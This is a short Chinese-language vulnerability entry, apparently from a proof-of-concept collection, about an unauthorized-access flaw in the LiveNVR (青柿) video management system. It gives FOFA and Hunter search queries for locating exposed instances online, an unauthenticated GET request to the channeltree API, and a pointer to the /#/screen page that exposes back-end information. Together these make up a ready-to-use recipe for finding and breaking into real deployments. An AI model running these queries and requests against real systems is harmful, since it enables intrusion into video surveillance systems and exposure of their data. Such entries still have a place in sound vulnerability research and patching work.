# LiveNVR流媒体服务软件接口存在未授权访问漏洞

livenvr 青柿视频管理系统 channeltree 存在未授权访问漏洞。

## fofa

```yaml
icon_hash="-206100324" 
```

## hunter

```yaml
web.icon=="7bfff01de80c14288ff385cd7db83c56"
```

## poc

```yaml
GET /api/v1/device/channeltree?serial=&pcode HTTP/1.1
Host: 
```

![image-20240719130739033](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407191307146.png)

接口访问` /#/screen ` 可以看到后台信息了

![image-20240719130703174](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407191307314.png)

## 漏洞来源

- https://mp.weixin.qq.com/s/whXXvwzZpfj19B7unFCrjg